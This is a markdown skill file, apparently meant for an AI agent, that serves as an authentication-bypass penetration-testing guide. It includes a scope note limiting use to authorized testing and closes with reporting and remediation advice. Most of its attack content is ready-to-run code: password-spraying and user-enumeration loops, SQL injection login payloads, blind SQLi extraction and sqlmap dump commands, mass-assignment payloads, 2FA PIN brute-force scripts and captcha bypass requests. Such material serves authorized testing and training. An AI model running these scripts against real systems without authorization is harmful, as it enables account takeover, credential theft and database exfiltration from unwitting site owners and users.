---
name: auth-bypass
description: Authentication bypass testing - default creds, SQL injection in login, logic flaws, response manipulation, mass assignment on auth, and session weaknesses for authorized penetration testing.
---

# Authentication Bypass Testing

> **Scope:** Only test systems you have explicit written authorization to test. All techniques below are for authorized penetration testing, in-scope bug bounty programs, and security training labs.

## Overview & Impact

Authentication is the gatekeeper of every application. A bypass means an attacker gains access to another user's account, an admin panel, or the entire user base without valid credentials.

**Impact tiers:**
- **Critical:** Full account takeover (ATO) of arbitrary users, admin panel access, auth bypass on API gateway.
- **High:** Privilege escalation low-priv → admin, 2FA bypass, session fixation leading to ATO.
- **Medium:** User enumeration, weak lockout allowing slow brute force, predictable reset tokens.

**Common root causes:** inconsistent error handling, client-side trust (response manipulation), logic flaws in multi-step flows, mass assignment on registration/profile endpoints, weak session management, missing rate limiting.

## Recon & User Enumeration

### Differential response analysis

Compare login responses for valid vs invalid usernames. Look at: HTTP status code, `Content-Length`, response body text, response time, and error string differences.

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpass
```

```http
HTTP/1.1 200 OK
Content-Length: 3289

<div class="error">Invalid username or password</div>
```

vs an invalid username:

```http
HTTP/1.1 200 OK
Content-Length: 3287

<div class="error">Invalid username or password</div>
```

A 2-byte diff = enumeration oracle. Also check for `Invalid password` vs `Invalid username` wording, or a 302 redirect on valid user + wrong password.

### Timing attacks with long passwords

When the username exists, the server performs a bcrypt/hash comparison. Supply an extremely long password (~10-50KB) to amplify the timing delta.

```bash
LONGPASS=$(python3 -c "print('A'*30000)")
for user in admin administrator root test john; do
  curl -s -o /dev/null -w "$user: %{time_total}\n" -X POST https://target.com/login \
    -d "username=$user&password=$LONGPASS"
done
```

Valid usernames typically respond measurably slower (hash comparison runs; invalid users short-circuit).

### Forgot-password and registration probing

```bash
# Forgot-password: different response for existing vs non-existing accounts
curl -s -X POST https://target.com/forgot-password -d "email=admin@target.com" -i
curl -s -X POST https://target.com/forgot-password -d "email=nosuchuser@target.com" -i

# Registration: "email already taken" = user exists
curl -s -X POST https://target.com/register -d "username=admin&password=Xx9!aaaa&email=a@b.c" -i
```

### Burp Intruder cluster bomb

1. Capture a login POST, send to Intruder.
2. Attack type: **Cluster bomb**. Payload position 1 = username, position 2 = password.
3. Payload set 1: candidate usernames. Payload set 2: top passwords.
4. Grep-Match on `Invalid username or password` — invert match to find hits. Also grep status codes and content length.

### ffuf-based enumeration

```bash
# Enumerate valid usernames via response size diff (fs = filter size of invalid response)
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=Test1234!" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u https://target.com/login -mc all -fs 3287

# Match on error string variants
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=x" \
  -u https://target.com/login -H "Content-Type: application/json" \
  -mr "Invalid password" -mc 200
```

### HTTP status code diffs

Some apps return `401` for bad password but `403`/`500` for unknown user, or `302` for valid creds. Always fuzz with `-mc all` and sort by status code.

## Default & Weak Credentials

### Vendor defaults table

| Product | Username | Password |
|---|---|---|
| Tomcat | tomcat | tomcat / s3cret |
| Grafana | admin | admin |
| Kibana | elastic | changeme |
| phpMyAdmin | root | (empty) |
| Zabbix | Admin | zabbix |
| Nacos | nacos | nacos |
| GlassFish | admin | adminadmin |
| WebLogic | weblogic | weblogic / welcome1 |
| JBoss | admin | admin |
| H2 DB | sa | (empty) |
| PostgreSQL | postgres | postgres |
| MySQL | root | (empty) |
| Jenkins | admin | (initialAdminPassword file) |
| Spring Boot Actuator | (none) | (none — unauthenticated /actuator) |

### Top credential lists

```bash
git clone https://github.com/danielmiessler/SecLists.git
# Use: SecLists/Passwords/Default-Credentials/top-default-passwords.txt
#      SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
#      SecLists/Usernames/Names/names.txt
```

### Wordlist generation with cewl + hashcat rules

```bash
# Scrape target-specific vocabulary from the site
cewl -d 3 -m 6 -w target-words.txt https://target.com

# Apply mutation rules (append years, digits, capitalization)
cat target-words.txt | hashcat --stdout -r /usr/share/hashcat/rules/best64.rule > target-passlist.txt

# Company name + year combos
for base in $(cat company-terms.txt); do
  for y in 2023 2024 2025; do
    echo "${base}${y}"; echo "${base^^}$y"; echo "${base^}$y!"; echo "${base}$y!";
  done
done > company-spray.txt
```

### Password spraying

```bash
# Hydra HTTP POST form
hydra -L users.txt -p 'Spring2025!' target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid username or password" -t 4 -w 3

# brutespray — spray Nmap-discovered services
nmap -sS -p 22,21,3306,3389,5432 target-range/24 -oG nmap-scan.gnmap
brutespray --file nmap-scan.gnmap --continuous --threads 5 --hosts 5

# Spray one password across many users (avoids per-account lockout)
for user in $(cat users.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"Spring2025!\"}")
  [ "$code" != "401" ] && echo "[!] $user -> $code"
  sleep 2
done
```

**Spray discipline:** 1-2 passwords per user per day max, respect lockout policies, log every attempt.

## SQL Injection in Login Forms

### Classic bypass payloads

```text
' OR 1=1--
' OR 1=1-- -
' OR '1'='1
admin'--
admin' #
' OR 1=1 LIMIT 1--
" OR 1=1--
' OR 1=1#
') OR 1=1--
' UNION SELECT 1,2,3--
```

```bash
curl -s -X POST https://target.com/login \
  --data-urlencode "username=' OR 1=1--" --data-urlencode "password=x" -i
```

If the query is `SELECT * FROM users WHERE username='$u' AND password='$p'`, then `username=' OR 1=1--` logs in as the **first row** (often admin).

### Blind SQLi for password extraction

When the login is injectable but doesn't return data, use boolean-based or time-based extraction:

```bash
# Boolean-based: does the first char of admin's password hash equal 'a'?
for c in {a..z} {0..9}; do
  resp=$(curl -s -X POST https://target.com/login \
    --data-urlencode "username=admin' AND SUBSTRING(password,1,1)='$c'-- " \
    --data-urlencode "password=x")
  echo "$resp" | grep -q "Invalid password" || echo "[+] char1=$c"
done

# Time-based (sleep 5s = TRUE)
curl -s -o /dev/null -w "%{time_total}\n" -X POST https://target.com/login \
  --data-urlencode "username=admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)-- " \
  --data-urlencode "password=x"
```

### sqlmap against login

```bash
sqlmap -u "https://target.com/login" --data="username=admin&password=x" \
  -p username --technique=BEUST --level=3 --risk=2 --batch

# Extract password hashes once injection confirmed
sqlmap -u "https://target.com/login" --data="username=admin&password=x" \
  -p username --dump -T users --batch

# Crack dumped hashes
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt        # MD5
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt     # bcrypt
```

### Second-order SQLi via registration

Register an account with a SQLi payload as the username/email. The payload is stored, then executed when the app later queries it (e.g., password change, profile lookup, admin user list).

```text
Registration username:  admin'--
Registration email:     ' OR 1=1--
```

Then trigger the second-order query (e.g., change password on that account) — if the backend does `SELECT ... WHERE username='$stored_username'`, the payload fires and may change the admin's password.

## Logic Flaws

### Skip registration steps / parameter tampering

Multi-step flows often trust the client to send the right step. Force the final step directly:

```bash
# Normal flow: /register/step1 -> /register/step2 -> /register/finish
# Try hitting the finish endpoint directly with a crafted session
curl -s -X POST https://target.com/register/finish \
  -b "session=abc123" -d "username=hacker&password=Pass123!" -i
```

### Response manipulation (0 -> 1)

Client-side trust flaws: the server returns a JSON status the client checks. Intercept the response in Burp (Match & Replace or Repeater) and flip it.

```http
HTTP/1.1 200 OK

{"success": false, "error": "Invalid 2FA code"}
```

Manipulate to:

```http
HTTP/1.1 200 OK

{"success": true, "error": null}
```

Use Burp **Match & Replace** (Proxy > Options) to auto-replace `"success":false` with `"success":true` during manual browsing.

### Role parameter tampering / mass assignment

Registration and profile-update endpoints often accept extra JSON fields that overwrite server-side attributes:

```bash
# Register with an injected role
curl -s -X POST https://target.com/api/register -H "Content-Type: application/json" -d '{
  "username": "attacker",
  "password": "Pass123!",
  "email": "attacker@evil.com",
  "role": "admin",
  "isAdmin": true,
  "is_admin": 1,
  "permissions": ["admin", "superuser"]
}'

# Profile update mass assignment
curl -s -X PATCH https://target.com/api/profile \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"email": "me@x.com", "role": "admin", "accountType": "premium"}'
```

Try field name variants: `role`, `roles`, `isAdmin`, `is_admin`, `admin`, `userType`, `type`, `level`, `privilege`, `group`, `permissions`.

### Email change via parameter pollution (HPP)

```bash
# Duplicate email parameter — backend may use the first, validation the second
curl -s -X POST https://target.com/change-email \
  -b "session=victim-session" \
  -d "email=attacker@evil.com&email=victim@target.com"

# Or in JSON arrays
curl -s -X POST https://target.com/change-email \
  -H "Content-Type: application/json" \
  -d '{"email": ["attacker@evil.com", "victim@target.com"]}'
```

### OTP/PIN logic flaws — brute force 4-digit PIN with Burp macro

Only 10,000 possibilities for a 4-digit PIN. If there's no rate limit and the session isn't invalidated on failure:

1. Capture a valid 2FA request for your own account.
2. Intruder: payload = 0000-9999 (numeric, 4 digits).
3. If the session expires after N failures, use a **Burp macro** (Session Handling Rules > Add > Macro) that re-runs the login request to obtain a fresh session cookie before each 2FA attempt.
4. Grep for the success response (e.g., absence of error string, or 302 redirect).

```bash
# Equivalent curl loop with session refresh
for pin in $(seq -w 0 9999); do
  sess=$(curl -s -i -X POST https://target.com/login \
    -d "username=test&password=Test1234!" | grep -i 'set-cookie' | cut -d' ' -f2)
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/2fa \
    -b "session=$sess" -d "pin=$pin")
  [ "$code" == "302" ] && echo "[+] PIN found: $pin" && break
done
```

### Changing email in step 2 of 2FA

Some flows: step 1 = password, step 2 = OTP sent to the email **on file**. If step 2's request accepts an `email` parameter, an attacker mid-flow can redirect the OTP to their own email:

```http
POST /2fa HTTP/1.1
Cookie: session=<attacker-session>

otp=123456&email=attacker@evil.com
```

### Username case handling

```bash
# If 'admin' is locked out, try case variants that may bypass lockout
# but still resolve to the same account (case-insensitive DB lookup)
for u in ADMIN Admin aDmIn admIn; do
  curl -s -o /dev/null -w "$u: %{http_code}\n" -X POST https://target.com/login \
    -d "username=$u&password=Spring2025!"
done
```

### Trailing spaces & unicode normalization

```bash
# Trailing space may bypass a duplicate-account check or lockout
curl -s -X POST https://target.com/register -d "username=admin%20&password=x" -i
curl -s -X POST https://target.com/login -d "username=admin%20&password=x" -i

# Unicode normalization: homoglyphs/combining chars may pass a uniqueness
# check but normalize to 'admin' at login
printf 'admin\xC4\xB0'   # Turkish dotted I
printf 'admin\xC2\xA0'   # non-breaking space
```

## OAuth/SSO Specific

See the **oauth** skill for full coverage. Quick checklist for auth bypass context:

- `redirect_uri` manipulation to steal authorization codes.
- `state` parameter missing → CSRF on the OAuth flow → login CSRF (attacker logs victim into attacker's account).
- Implicit flow token leakage via referrer.
- Pre-account-takeover: register with a victim's email before they use SSO → account linking takeover.
- `id_token` signature validation bypass (`alg: none`, kid confusion, JWKS injection).

## Password Reset Flows

See the **password-reset-poisoning** skill for full coverage. Quick checklist:

- Host header injection to poison reset links.
- Reset token in response body or predictable token.
- No token expiration / token reuse.
- Password reset for user A changes user B's password (user parameter tampering).

## Session Weaknesses

### Predictable session IDs

```bash
# Collect 50-100 session tokens (register/login repeatedly), analyze entropy
for i in $(seq 1 50); do
  curl -s -i -X POST https://target.com/login -d "username=test$i&password=Test1234!" \
    | grep -i 'set-cookie' | cut -d' ' -f2 | cut -d';' -f1
done > tokens.txt
# Look for: sequential values, timestamps, base64-encoded usernames, MD5 of known data
cat tokens.txt | sort | uniq -c | sort -rn | head
```

Test for: incrementing integers, Unix timestamps, MD5 of username, base64 of `user:timestamp`, PRNG with short seed.

### Non-rotating tokens after login / session fixation

If the session ID is the same before and after authentication, session fixation is possible:

```bash
# 1. Get a pre-auth session
pre=$(curl -s -i https://target.com/login | grep -i 'set-cookie' | cut -d' ' -f2)
echo "Pre-auth: $pre"

# 2. Authenticate with that same session
curl -s -i -X POST https://target.com/login -b "$pre" -d "username=test&password=Test1234!" \
  | grep -i 'set-cookie'
# If no new Set-Cookie -> session not rotated -> fixation possible
```

**Session fixation attack:** attacker obtains a pre-auth session ID, sends the link/cookie to the victim, victim logs in, attacker reuses the now-authenticated session.

### Other session checks

- Cookie flags: `Secure`, `HttpOnly`, `SameSite`.
- Session expiry: does the session survive logout? Does it expire after inactivity?
- Concurrent sessions: unlimited parallel sessions per account?
- Logout: does it invalidate server-side or just delete the client cookie?

## 2FA/MFA Bypasses

### Direct page access after step 1

Complete step 1 (password), then skip step 2 by directly requesting a post-auth page:

```bash
curl -s -i -X POST https://target.com/login -d "username=victim&password=known" -c cookies.txt
curl -s -i -b cookies.txt https://target.com/dashboard
```

### Null / zero / empty values

```http
POST /2fa HTTP/1.1
Cookie: session=<valid>

otp=
```

Try: `otp=`, `otp=000000`, `otp=null`, `otp=undefined`, `otp[]=`, `otp=true`, removing the parameter entirely, or sending the request without a body.

### Response manipulation

```http
# Server response:
{"verified": false, "message": "Invalid code"}
# Manipulate to:
{"verified": true, "message": "OK"}
```

Or flip a `401` to `200` with a valid-looking body — some frontends only check the status code.

### Brute force without rate limit

See the 4-digit PIN brute force with Burp macro in the Logic Flaws section. For 6-digit codes, check whether failed attempts reset the counter, whether the session refreshes, and whether there's a per-IP vs per-account limit.

### Remember-token flaws

- "Remember me" cookie with predictable value (username + static secret).
- Remember token that bypasses 2FA entirely — steal it and you're in.
- Token that doesn't expire on password change.

### Reusing codes

```bash
# If the same OTP works twice, or a code from a previous login still works:
curl -s -X POST https://target.com/2fa -b "session=$sess" -d "otp=123456" -i
curl -s -X POST https://target.com/2fa -b "session=$sess2" -d "otp=123456" -i
```

### Missing re-auth on sensitive actions

Changing email, password, or disabling 2FA should require re-authentication. Test:

```bash
# With only a stolen session cookie (no 2FA re-entry), can you disable 2FA?
curl -s -X POST https://target.com/account/disable-2fa -b "session=stolen" -i
# Can you change the password without re-entering the current one?
curl -s -X POST https://target.com/account/change-password -b "session=stolen" \
  -d "new_password=Attacker123!" -i
```

### Out of scope note

**SMS OTP interception via SIM swapping is out of scope** for standard web app testing — it targets the telecom layer, not the application. Note it in reports only as a risk observation, never attempt it.

## Captcha Bypasses

```bash
# 1. Remove the captcha parameter entirely
curl -s -X POST https://target.com/login -d "username=admin&password=x" -i

# 2. Reuse a previously solved captcha token
curl -s -X POST https://target.com/login -d "username=admin&password=x&captcha=SOLVED_TOKEN" -i

# 3. Send an empty captcha value
curl -s -X POST https://target.com/login -d "username=admin&password=x&captcha=" -i

# 4. Client-side validation only — check if the captcha is verified in JS
curl -s https://target.com/login | grep -i captcha
```

Other checks: captcha image is a static file (same answer every time), captcha is case-insensitive with a small charset, captcha response is returned in the page HTML, OCR with `tesseract` for weak captchas, or the captcha is only enforced on the frontend.

## Lab / Homelab Practice

### PortSwigger Web Security Academy — Authentication labs

- Username enumeration via different responses
- Username enumeration via subtly different responses
- Username enumeration via response timing
- Broken brute-force / IP block bypass
- 2FA simple bypass
- 2FA broken logic
- Brute-forcing a stay-logged-in cookie
- Password reset poisoning via middleware
- Password brute-force via password reset timestamps
- Authentication bypass via encryption
- Authentication bypass via state machine
- User ID controlled by request parameter (auth bypass)

### DVWA / vulnapi / crAPI

```bash
# DVWA — Damn Vulnerable Web Application (default creds: admin / password)
docker run -d -p 80:80 vulnerables/web-dvwa
# Practice: Brute Force module (low/medium/high/impossible levels)

# VAmPI — vulnerable REST API for auth testing
docker run -d -p 5000:5000 thealpine/vampi
# Practice: JWT flaws, mass assignment, broken auth on /users/v1

# crAPI — Comprehensive RESTful API
docker compose -f docker-compose.yml up
# Practice: 2FA bypass, password reset flaws, JWT confusion
```

## Reporting

**Report structure for each finding:**

1. **Title:** e.g., "Authentication Bypass via Response Manipulation in 2FA Flow"
2. **Severity:** CVSS v3.1 base score + qualitative rating.
3. **Affected endpoint(s):** exact URLs, methods, parameters.
4. **Steps to reproduce:** numbered, with raw HTTP requests/responses.
5. **Impact:** what an attacker gains, business risk.
6. **Evidence:** screenshots, request/response pairs, timing data tables.
7. **Remediation:** specific, actionable fixes.

**Example finding write-up:**

```markdown
## 2FA Bypass via Response Manipulation

**Severity:** Critical (CVSS 9.8)
**Endpoint:** POST /api/v2/verify-otp

**Steps:**
1. Log in with valid credentials; server responds with `{"verified":false}` on wrong OTP.
2. Intercept the response in Burp and change `"verified":false` to `"verified":true`.
3. Client proceeds to the authenticated dashboard.

**Impact:** Complete account takeover for any user whose password is known,
without knowledge of the OTP.

**Remediation:** Enforce 2FA verification server-side; never trust client-side
state for authorization decisions.
```

## Remediation

### Rate limiting

- Per-account AND per-IP AND per-session limits on login, 2FA, and reset endpoints.
- Exponential backoff: 1s, 2s, 4s, 8s... after each failure.
- Use a server-side token bucket; never rely on client-side throttling.
- Log and alert on anomalous patterns (many failures across many accounts = spraying).

```nginx
# Example: nginx rate limiting
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
location /login {
    limit_req zone=login burst=3 nodelay;
}
```

### MFA

- Enforce TOTP/WebAuthn (FIDO2) over SMS.
- Require MFA re-entry for sensitive actions (password change, email change, 2FA disable).
- Invalidate all sessions and remember-me tokens on password change.

### Consistent error messages

- Always return the same generic message: `"Invalid username or password."`
- Same HTTP status code, same Content-Length, same response time profile.
- Registration: `"If this email is available, you will receive a confirmation."`
- Forgot-password: identical response whether or not the account exists.

### Account lockout with backoff

- Lock after 5-10 failures, but use **temporary lockout with exponential backoff** rather than permanent lock (avoids DoS via lockout abuse).
- Notify the account owner of failed attempts.
- Combine with CAPTCHA after N failures rather than hard lockout.
- Ensure lockout keys on the account, not just the IP (prevents distributed spraying).

### General hardening checklist

- [ ] Server-side validation of all auth state (never trust client responses).
- [ ] Parameterized SQL queries everywhere (ORM or prepared statements).
- [ ] Session rotation on login and privilege change.
- [ ] Strong session entropy (≥128 bits), `Secure`/`HttpOnly`/`SameSite=Lax` flags.
- [ ] Mass assignment protection: allowlist of writable fields per endpoint.
- [ ] Uniform case handling and trimming of usernames/emails.
- [ ] Rate limiting on all auth endpoints with monitoring/alerting.
- [ ] Generic error messages across all auth flows.
- [ ] 2FA with no bypass paths, no code reuse, and per-attempt rate limiting.
- [ ] Password reset tokens: single-use, short-lived, cryptographically random.
